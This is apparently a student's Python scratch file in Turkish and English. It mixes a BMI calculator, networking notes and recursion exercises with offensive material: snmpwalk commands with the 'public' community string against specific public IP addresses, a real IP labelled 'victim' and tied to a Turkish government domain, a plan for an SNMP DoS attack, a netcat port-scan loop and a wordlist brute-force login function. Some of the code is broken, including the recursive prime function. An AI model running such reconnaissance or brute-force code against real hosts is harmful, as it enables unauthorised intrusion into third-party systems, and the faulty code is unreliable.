#!/usr/bin/ python
# -*- coding: utf-8 -*-

"""
kg=int(input("lütfen kilonuzu giriniz: "))
boy=int(input("lütfen boyunuz giriniz: "))

boy=boy/100

vki=kg/boy**2

if vki<18.5:
    print("zayıfsınız çünkü kitle indeksiniz", vki)

elif vki>=18.5 and vki<=25.5:
    print("normal kilodasınız kitke indeksiniz", vki)

elif vki >=25.5 and vki<=29.9:
    print("fazla kilodasınız kitle indexsiniz", vki)

elif vki >= 30 and vki <= 39.9:
    print("şişmansınız kitle indexsiniz", vki)

elif vki >= 40:
    print("obezite riski mevcut kitle indexsiniz", vki)

"""

# ping ddos +

# icmp snmp  curl wget tor proxy ssh ftp smtp 'win servers'

# DESTINATION IP: 8.8.8.8


# import os
# os.system("ping -c 1 8.8.8.8")

# layer1: physical layer (cable, hub)
# layer2: data link layer (switch, mac address)
# layer3: network layer (router, ip address) 

# IP CLASS A: 1-126		wide area network
# IP CLASS B: 128-191
# IP CLASS C: 192-223 local area network
# IP CLASS D: 224-239	

# wtfismyip.com
# wtfismyip.com/text
# wtfismyip.com/json   # dictionary
# wtfismyip.com/xml


# data structures in python
# i = 5 # int integer
# c = 't' # char character


# algorithm design and analysis in python
# big o notation

# if: 1
# for: n
# while: n
# for i in range(1, n): n
# for i in range(1, n, 2): n/2
# for in for: n^2

# degisn patterns in python
# singleton

# layer1 layer2 layer3 layer4 layer5 layer6 layer7
# osi model

# port 80 & 443    (http & https)

'''
# read from samples.txt file and ping to all ips
read = open("samples.txt", "r")
for i in read:
		# os.system("ping -c 1 " + i)
		# print('IP: ' + i)
		print('IP: ', i)
		# check 80 & 443 ports with nc

read = open("samples.txt", "r")
for i in read:
	os.system("nc -zv " + i + " 80")
	os.system("nc -zv " + i + " 443")
	os.system("nc -zv " + i + " 444")
   
'''

# vi practices_.py
# :wq

# http://wireshark.askapache.com

# wtfismyip.com

# ipinfo.io




# sudo apt-get install snmp

# ifconfig | grep inet

# ip a

# ipconfig

# 192.168.1.1

# https://www.comparitech.com/net-admin/snmpwalk-examples-windows-linux/

# snmpwalk -v1 -c public 176.42.5.94

# nmap uygulaması

# https://www.shodan.io/search?query=country%3ATR+SNMP

# snmp 161 port
# snmp-trap 162 port

# https://www.shodan.io/host/176.236.148.62

# http://teski.gov.tr


# snmpwalk -v1 -c public 176.236.148.62 ip.24.4.1.4.172.16.9.0.255.255.255.240.0.172.16.9.2

# https://www.loriotpro.com/Products/On-line_DocumentationV3/LoriotProV3Doc/C3-Introduction_to_Network_Supervision/C3-D4_SNMP_Object.htm

# snmpwalk -v1 -c public 176.236.148.62 1.3.6.1.2.1 | more

# exploit-db.com
 
# syslog


# yazilacak program: daha once yazdigimiz dos ataginin snmp versionu 


wireshark

tshark

tcpdump --version


# social engineering toolkit
# metasploit

# mitm attack

# man in the middle attack

# https://www.geeksforgeeks.org/top-10-kali-linux-tools-for-hacking/



# a python program that reads from a wordlist.txt file and brute force a login page


# import requests

import sys
import time
import os

os.system("clear")
print("Attack started...")

# teski.gov.tr
victim = '176.236.148.62'

def brute_force():
	url = "http://github.com"
	wordlist = "wordlist.txt"

	read = open(wordlist, "r")
	for i in read:
			r = requests.post(url, data = {"username": "admin", "password": i})
			if "Invalid" not in r.text:
					print("Password found: ", i)
					sys.exit()
			print("Connection error")
			sys.exit()	
  
# first try to ping to the ip address - and than try to brute force
def ping():
	os.system("ping -c 1 " + victim)


#  https://github.com/features/copilot


# recursive function (arastirilacak)
def countdown_timer(x):
    if x == 0:
        print('Blastoff!')
    else:
        print(x)
        countdown_timer(x-1)
        
        
for i in range(5, 0, -1):
		print(i)
 
countdown_timer(5)





# for dongusu ile recursive function arasindaki fark nedir?

# for
girdi= int(input('Enter your number here: '))

liste=[]
for i in range(2, girdi):
    if girdi % int(i) == 0:
        liste.append(i)
print(liste)
if len(liste) != 0:
    print(str(girdi)+' Not a Prime Number')
elif len(liste) == 0:
    print(str(girdi)+' Prime Number ')





# recursive
n = int(input('Enter your number here: '))

liste=[]
def get_prime_recursive(n):
		if n == 2:
				liste.append(2)
		elif n > 2:
				if girdi % int(i) == 0:
						liste.append(i)
				return get_prime_recursive(n-1)
print(liste)
if len(liste) != 0:
    print(str(girdi)+' Not a Prime Number')
elif len(liste) == 0:
    print(str(girdi)+' Prime Number ')


# yazilacak : recursive ile for arasindaki malieyt fark nedir?